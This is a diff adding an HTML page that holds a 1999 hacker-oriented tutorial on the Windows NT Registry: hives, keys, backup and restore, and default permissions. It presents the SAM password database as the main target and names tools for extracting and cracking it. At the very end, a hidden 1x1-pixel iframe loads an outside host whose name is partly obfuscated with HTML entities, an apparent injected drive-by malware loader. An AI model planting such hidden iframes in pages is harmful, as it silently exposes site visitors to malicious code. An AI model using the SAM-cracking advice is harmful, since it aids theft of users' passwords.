@@ -1,0 +1,372 @@
+<html>
+<head>
+<title>Windows NT Registry Tutorial</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<div align="center">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I    <b>Windows NT Registry</b>      I   Written by:     /
+    >                     I          <b>Tutorial</b>           I                  <
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   <a href="mailto:nijjerm@cadvision.com">Jatt</a>            \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+</div>
+<p>Version 1.0, 6.8.1999</p>
+<p>Note: most of what's written in this tutorial applies to Windows 9x as well.<p>
+<h3>What is the Registry?</h3>
+<p>The Registry is the central core registrar for Windows NT. Each NT workstation for server has its own Registry,
+and each one contains info on the hardware and software of the computer it resides on. For example, com port
+definitions, Ethernet card settings, desktop setting and profiles, and what a particular user can and cannot do
+are stored in the Registry. Remember those ugly system INI files in Windows 3.1? Well, they are all included with
+even more fun stuff into one big database called the Registry in NT.</p>
+<p>One of the main disadvantages to the older .INI files is that those files are flat text files, which are
+unable to support nested headings or contain data other than pure text. Registry keys can contain nested headings
+in the form of subkeys. These subkeys provide finer details and a greater range to the possible configuration
+information for a particular operating system. Registry values can also consist of executable code, as well as
+provide individual preferences for multiple users of the same computer. The ability to store executable code within
+the Registry extends its usage to operating system and application developers. The ability to store user-specific
+profile information allows one to tailor the environment for specific individual users.</p>
+<p>Always make sure that you know what you are doing when changing the registry or else just one little mistake
+can crash the whole system. That's why it's always good to back it up!</p>
+<p>To view the registry of an NT server (or to back it up), you need to use the Registry Editor tool. There are
+two versions of Registry Editor:</p>
+<blockquote>
+<ul>
+  <li>:Regedt32.exe has the most menu items and more choices for the menu items. You can search for keys and subkeys
+       in the registry.</li>
+  <li>:Regedit.exe enables you to search for strings, values, keys, and subkeys. This feature is useful if you want
+       to find specific data.</li>
+</ul>
+</blockquote>
+<h3>Some Info on NT:</h3>
+<p>32 bit GUI Windows networking (client server model) Operating System. 1st version: 3.1 (circa 1994), then 3.5,
+then 3.51, then 4.0 (most used and this version was the 1st to adopt the same GUI as Windows 95). NT stands for New
+Techology. NT's main competitor is Novel Netware which is more established and has been around longer as a network
+operating system. Despite that, it is losing market share to NT and Linux.  That's why NT is becoming a little bit more
+important. Windows 2000 which is supposedly the next version is supposed to be out sometime in October 1999. This version
+formerly called Cairo has been delayed 3 times over the last 2-3 years. Everything in this tutorial directory relates to
+Windows NT v. 4.0 . Some of this might also be useful for Windows 95 and Windows 98 but please note that despite the
+similar GUI environments all of them have major differences between each other and each are distinct. The major
+difference is security, with NT there is a decent degree of security and robustness. With Windows 95, and 98 there is
+hardly any security at all. For example with NT you cannot log in without a password and a username that is correct.
+With Windows 98/95, just hit the cancel button on the log on menu (which is not usually enabled anyways) and you will
+get into the system. With NT, you can have a network from anywhere from 20-20,000 users or so on the same domain.
+Each Domain will have a Primary Domain Controller (PDC) and a few Backup Domain Controllers (BDC's).  There is only
+one PDC in a domain, it is the main server that holds all the log in info and does most of the work.  BDC's are
+backups in case the PDC gets to busy such as  multiple users logging in at the same time. PDC has all the official
+settings for the entire domain (in most cases an entire network) on it.  BDC's usually have partial and not right
+up-to-date settings and information on it.  Backing up the Registry of your PDC (Primary Domain Controller) is an
+important part of disaster prevention, because it contains all of your user accounts. If you ever have to rebuild a
+PDC from scratch, then you can restore your user accounts by restoring the Registry.</p>
+<h3>Backup and Restore:</h3>
+<p>Even with Windows 98, and Windows 95  you can not just backup the registry when you back up files. What you
+would need to do is run either: regedit32.exe  (for NT)  or regedit.exe  and then click the registry menu, then click
+export registry. The next step is to click all, then pick the drive to back up onto (usually a removable drive like
+tape, floppy, cd, zip drive, jazz drive etc.) and then hit "ok".  To restore a registry from a backed up version,
+enter the registry program the same way, click import registry and click the drive and path where the backup is
+and hit "ok". It will restore it back to the previous backed up settings and may require a reboot.</p>
+<p>Note: registry backups are saved as .reg files, and they are associated with regedit as default. This means
+that once you double-click a .reg file, it's contents will be inserted into your own registry.</p>
+<h3>What is SAM?</h3>
+<p>SAM is short for Security Accounts Manager, which is located on the PDC and has information on all user
+accounts and passwords. Most of the time while the PDC is running, it is being accessed or used.</p>
+<h3>What do I do with a copy of SAM?</h3>
+<p>You get passwords. First use a copy of SAMDUMP.EXE to extract the user info out of it. You do not need to
+import this data into the Registry of your home machine to play with it. You can simply load it up into one of
+the many applications for cracking passwords, such as L0phtCrack, which is available from:
+<a href="http://www.L0phtCrack.com" target="_blank">http://www.L0phtCrack.com</a></p>
+<p>Of interest to hackers is the fact that all access control and assorted parameters are located in the Registry.
+The Registry contains thousands of individual items of data, and is grouped together into "keys" or some type of
+optional value. These keys are grouped together into subtrees -- placing like keys together and making copies of
+others into separate trees for more convenient system access.</p>
+<p>The Registry is divided into four separate subtrees. These subtrees are called
+<ul>
+  <li>HKEY_CLASSES_ROOT</li>
+  <li>HKEY_CURRENT_USER</li>
+  <li>HKEY_LOCAL_MACHINE</li>
+  <li>HKEY_USERS</li>
+</ul>
+We'll go through them from most important to the hacker to least important to the hacker.</p>
+<p>First and foremost is the HKEY_LOCAL_MACHINE subtree. It contains five different keys. These keys are as follows:
+<ul>
+  <li>SAM and SECURITY - These keys contain the info such as user rights, user and group info for the domain
+  (or workgroup if there is no domain), and passwords. In the NT hacker game of capture the flag, this is the flag.
+  Bag this and all bets are off.</li>
+</ul>
+<p>The keys are binary data only (for security reasons) and are typically not accessible unless you are an
+Administrator or in the Administrators group. It is easier to copy the data and play with it offline than to work
+on directly. This is discussed in a little more detail in section 09-4.
+<ul>
+  <li>HARDWARE - this is a storage database of throw-away data that describes the hardware components
+  of the computer. Device drivers and applications build this database during boot and update it during
+  runtime (although most of the database is updated during the boot process). When the computer is
+  rebooted, the data is built again from scratch. It is not recommended to directly edit this particular
+  database unless you can read hex easily.</li>
+</ul>
+
+<p>There are three subkeys under HARDWARE, these are the Description key, the DeviceMap key, and the ResourceMap
+key. The Description key has describes each hardware resource, the DeviceMap key has data in it specific to
+individual groups of drivers, and the ResourceMap key tells which driver goes with which resource.
+<ul>
+  <li>SYSTEM - This key contains basic operating stuff like what happens at startup, what device drivers are
+  loaded, what services are in use, etc. These are split into ControlSets which have unique system configurations
+  (some bootable, some not), with each ControlSet containing service data and OS components for that ControlSet.
+  Ever had to boot from the "Last Known Good" configuration because something got hosed? That is a ControlSet stored here.</li>
+  <li>SOFTWARE - This key has info on software loaded locally. File associations, OLE info, and some miscellaneous
+  configuration data is located here.</li>
+</ul>
+<p>The second most important main key is HKEY_USERS. It contains a subkey for each local user who accesses
+the system, either locally or remotely. If the server is a part of a domain and logs in across the network,
+their subkey is not stored here, but on a Domain Controller. Things such as Desktop settings and user
+profiles are stored here.</p>
+<p>The third and fourth main keys, HKEY_CURRENT_USER and HKEY_CLASSES_ROOT, contain copies of portions of
+HKEY_USERS and HKEY_LOCAL_MACHINE respectively. HKEY_CURRENT_USER contains exactly would you would
+expect a copy of the subkey from HKEY_USERS of the currently logged in user. HKEY_CLASSES_ROOT contains
+a part of HKEY_LOCAL_MACHINE, specifically from the SOFTWARE subkey. File associations, OLE configuration
+and dependency information.</p>
+<h3>What are hives?</h3>
+<p>Hives are the major subdivisions of all of these subtrees, keys, subkeys, and values that make up the
+Registry. They contain "related" data. Look, I know what you might be thinking, but this is just how Microsoft
+divided things up -- I'm just relaying the info, even I don't know exactly what all the advantages to this
+setup are. ;-)</p>
+<p>All hives are stored in %systemroot%\SYSTEM32\CONFIG. The major hives and their files are as follows:</p>
+<table>
+<tr>
+  <th>Hive</th>
+  <th>File</th>
+  <th>Backup File</th>
+</tr>
+<tr>
+  <td>HKEY_LOCAL_MACHINE\SOFTWARE</td>
+  <td>SOFTWARE</td>
+  <td>SOFTWARE.LOG</td>
+</tr>
+<tr>
+  <td>HKEY_LOCAL_MACHINE\SECURITY</td>
+  <td>SECURITY</td>
+  <td>SECURITY.LOG</td>
+</tr>
+<tr>
+  <td>HKEY_LOCAL_MACHINE\SYSTEM</td>
+  <td>SYSTEM</td>
+  <td>SYSTEM.LOG</td>
+</tr>
+<tr>
+  <td>HKEY_LOCAL_MACHINE\SAM</td>
+  <td>SAM</td>
+  <td>SAM.LOG</td>
+</tr>
+<tr>
+  <td valign="top">HKEY_CURRENT_USER</td>
+  <td>USERxxx<br>ADMINxxx</td>
+  <td>USERxxx.LOG<br>ADMINxxx.LOG</td>
+</tr>
+<tr>
+  <td>HKEY_USERS\.DEFAULT</td>
+  <td>DEFAULT</td>
+  <td>DEFAULT.LOG</td>
+</tr>
+</table>
+<p>Hackers should look for the SAM file, with the SAM.LOG file as a secondary target.
+This contains the password info.</p>
+<p>For ease of use, the Registry is divided into five separate structures that represent
+the Registry database in its entirety. These five groups are known as Keys, and are discussed below:</p>
+<h4>HKEY_CURRENT_USER</h4>
+<blockquote>
+<p>This registry key contains the configuration information for the user that is currently logged in.
+The users folders, screen colors, and control panel settings are stored here. This information is
+known as a User Profile.</p>
+</blockquote>
+<h4>HKEY_USERS</h4>
+<blockquote>
+<p>In windowsNT 3.5x, user profiles were stored locally (by default) in the systemroot\system32\config
+directory. In NT4.0, they are stored in the systemroot\profiles directory. User-Specific information
+is kept there, as well as common, system wide user information.</p>
+</blockquote>
+<p>This change in storage location has been brought about to parallel the way in which Windows95 handles
+its user profiles. In earlier releases of NT, the user profile was stored as a single file - either
+locally in the \config directory or centrally on a server. In windowsNT 4, the single user
+profile has been broken up into a number of subdirectories located below the \profiles directory.
+The reason for this is mainly due to the way in which the Win95 and WinNT4 operating systems use
+the underlying directory structure to form part of their new user interface.</p>
+<p>A user profile is now contained within the NtUser.dat (and NtUser.dat.log) files, as well as the
+following subdirectories:</p>
+<ul>
+  <li><b>Application Data:</b> This is a place to store application data specific to this particular user.</li>
+  <li><b>Desktop:</b> Placing an icon or a shortcut into this folder causes the that icon or shortcut to appear
+  on the desktop of the user.</li>
+  <li><b>Favorites:</b> Provides a user with a personalized storage place for files, shortcuts and other information.</li>
+  <li><b>NetHood:</b> Maintains a list of personlized network connections.</li>
+  <li><b>Personal:</b> Keeps track of personal documents for a particular user.</li>
+  <li><b>PrintHood:</b> Similar to NetHood folder, PrintHood keeps track of printers rather than network connections.</li>
+  <li><b>Recent:</b> Contains information of recently used data.</li>
+  <li><b>SendTo:</b> Provides a centralized store of shortcuts and output devices.</li>
+  <li><b>Start Menu:</b> Contains configuration information for the users menu items.</li>
+  <li><b>Templates:</b> Storage location for document templates.</li>
+</ul>
+<h4>HKEY_LOCAL_MACHINE</h4>
+<blockquote>
+<p>This key contains configuration information particular to the computer. This information is stored in the
+systemroot\system32\config directory as persistent operating system files, with the exception of the
+volatile hardware key.</p>
+</blockquote>
+<p>The information gleaned from this configuration data is used by applications, device drivers,
+and the WindowsNT 4 operating system. The latter usage determines what system configuration data to
+use, without respect to the user currently logged on. For this reason the HKEY_LOCAL_MACHINE regsitry
+key is of specific importance to administrators who want to support and troubleshoot NT 4.</p>
+<p><b>HKEY_LOCAL_MACHINE</b> is probably the most important key in the registry and it contains five subkeys:</p>
+<ul>
+  <li><b>Hardware:</b> Database that describes the physical hardware in the computer, the way device drivers use that
+  hardware, and mappings and related data that link kernel-mode drivers with various user-mode code. All data
+  in this sub-tree is re-created everytime the system is started.</li>
+  <li><b>SAM:</b> The security accounts manager. Security information for user and group accounts and for
+  the domains in NT 4 server.</li>
+  <li><b>Security:</b> Database that contains the local security policy, such as specific user rights.
+  This key is used only by the NT 4 security subsystem.</li>
+  <li><b>Software:</b> Pre-computer software database. This key contains data about software installed on the local
+  computer, as well as configuration information.</li>
+  <li><b>System:</b> Database that controls system start-up, device driver loading, NT 4 services and OS behavior.</li>
+</ul>
+<h4>Information about the HKEY_LOCAL_MACHINE\SAM Key</h4>
+<blockquote>
+<p>This subtree contains the user and group accounts in the SAM database for the local computer. For a
+computer that is running NT 4, this subtree also contains security information for the domain. The information
+contained within the SAM registry key is what appears in the user interface of the User Manager utility, as well
+as in the lists of users and groups that appear when you make use of the Security menu commands in NT4 explorer.</p>
+</blockquote>
+<h4>Information about the HKEY_LOCAL_MACHINE\Security key</h4>
+<blockquote>
+<p>This subtree contains security information for the local computer. This includes aspects such as assigning
+user rights, establishing password policies, and the membership of local groups, which are configurable
+in User Manager.</h4>
+</blockquote>
+<h4>HKEY_CLASSES_ROOT</h4>
+<blockquote>
+<p>The information stored here is used to open the correct application when a file is opened by using
+Explorer and for Object Linking and Embedding. It is actually a window that reflects information from
+the HKEY_LOCAL_MACHINE\Software subkey.</p>
+</blockquote>
+<h4>HKEY_CURRENT_CONFIG</h4>
+<blockquote>
+<p>The information contained in this key is to configure settings such as the software and device drivers to
+load or the display resolution to use. This key has a software and system subkeys, which keep track of
+configuration information.</p>
+</blockquote>
+<h3>Understanding Hives</h3>
+<p>The registry is divided into parts called hives. These hives are mapped to a single file and a
+.LOG file. These files are in the systemroot\system32\config directory.</p>
+<table>
+<tr>
+  <th>Registry Hive</th>
+  <th>File Name</th>
+</tr>
+<tr>
+  <td>HKEY_LOCAL_MACHINE\SAM</td>
+  <td>SAM and SAM.LOG</td>
+</tr>
+<tr>
+  <td>HKEY_LOCAL_MACHINE\SECURITY</td>
+  <td>Security and Security.LOG</td>
+</tr>
+<tr>
+  <td>HKEY_LOCAL_MACHINE\SOFTWARE</td>
+  <td>Software and Software.LOG</td>
+</tr>
+<tr>
+  <td>HKEY_LOCAL_MACHINE\SYSTEM</td>
+  <td>System and System.ALT</td>
+</tr>
+</table>
+<h3>QuickNotes</h3>
+<p>Ownership = The ownership menu item presents a dialog box that identifies the user who owns the
+selected registry key. The owner of a key can permit another user to take ownership of a key. In addition,
+a system administrator can assign a user the right to take ownership, or outright take ownership himself.</p>
+<p>REGINI.EXE = This utility is a character based console application that you can use to add keys to the
+NT registry by specifying a Registry script.</p>
+<hr align="center" width="75%">
+<p>The Following table lists the major Registry hives and some subkeys and the DEFAULT access permissions assigned:</p>
+<table>
+<tr>
+  <td colspan="2">\\ denotes a major hive<br>\denotes a subkey of the prior major hive</td>
+</tr>
+<tr>
+  <td valign="top">\\HKEY_LOCAL_MACHINE</td>
+  <td>Admin-Full Control<br>Everyone-Read Access<br>System-Full Control</td>
+</tr>
+<tr>
+  <td valign="top">\HARDWARE</td>
+  <td>Admin-Full Control<br>Everyone-Read Access<br>System-Full Control</td>
+</tr>
+<tr>
+  <td valign="top">\SAM</td>
+  <td>Admin-Full Control<br>Everyone-Read Access<br>System-Full Control</td>
+</tr>
+<tr>
+  <td valign="top">\SECURITY</td>
+  <td>Admin-Special (Write DAC, Read Control)<br>System-Full Control</td>
+</tr>
+<tr>
+  <td valign="top">\SOFTWARE</td>
+  <td>Admin-Full Control<br>Creator Owner-Full Control<br>Everyone-Special (Query, Set,
+   Create, Enumerate, Notify, Delete, Read)<br>System-Full Control</td>
+</tr>
+<tr>
+  <td valign="top">\SYSTEM</td>
+  <td>Admin-Special (Query, Set, Create, Enumerate, Notify, Delete, Read)<br>Everyone-Read Access<br>
+  System-Full Control</td>
+</tr>
+<tr>
+  <td valign="top">\\HKEY_CURRENT_USER</td>
+  <td>Admin-Full Control<br>Current User-Full Control<br>System-Full Control</td>
+</tr>
+<tr>
+  <td valign="top">\\HKEY_USERS</td>
+  <td>Admin-Full Control<br>Current User-Full Control<br>System-Full Control</td>
+</tr>
+<tr>
+  <td valign="top">\\HKET_CLASSES_ROOT</td>
+  <td>Admin-Full Control<br>Creator Owner-Full Control<br>Everyone-Special (Query, Set, Create,
+  Enumerate, Notify, Delete, Read)<br>System-Full Control</td>
+</tr>
+<tr>
+  <td valign="top">\\HKEY_CURRENT CONFIG</td>
+  <td>Admin-Full Control<br>Creator Owner-Full Control<br>Everyone-Read Access<br>System-Full Control</td>
+</tr>
+</table>
+<hr width="75%" align="center">
+<p>That's it for the Registry Tutorial. Questions or Comments should be forwarded to
+<a href="mailto:nijjerm@cadvision.com">nijjerm@cadvision.com</a></p>
+<p>&nbsp;</p>
+<p>Jatt</p>
+<p>&nbsp;</p>
+<p>Checkout these sites for more info:</p>
+<p>NT registry Hacks: <a href="http://www.jsiinc.com/default.htm?/reghack.htm" target="_blank">http://www.jsiinc.com/default.htm?/reghack.htm</a><br>
+Unofficial NT Hack: <a href="http://www.nmrc.org/faqs/nt/index.html" target="_blank">http://www.nmrc.org/faqs/nt/index.html</a><br>
+Rhino9: The Windows NT Security Research Team: <a href="http://www.xtreme.abyss.com/techvoodoo/rhino9" target="_blank">http://www.xtreme.abyss.com/techvoodoo/rhino9</a><br>
+Regedit.com - cool registry tricks: <a href="http://www.regedit.com" target="_blank">http://www.regedit.com</a></p>
+
+<p>Also please checkout: <a href="www.windows2000test.com" target="_blank">www.windows2000test.com</a> and give it  your best shot because Microsoft
+wants you to test their operating system's security flaws for them.  They are challenging all
+hackers to hack that site.</p>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
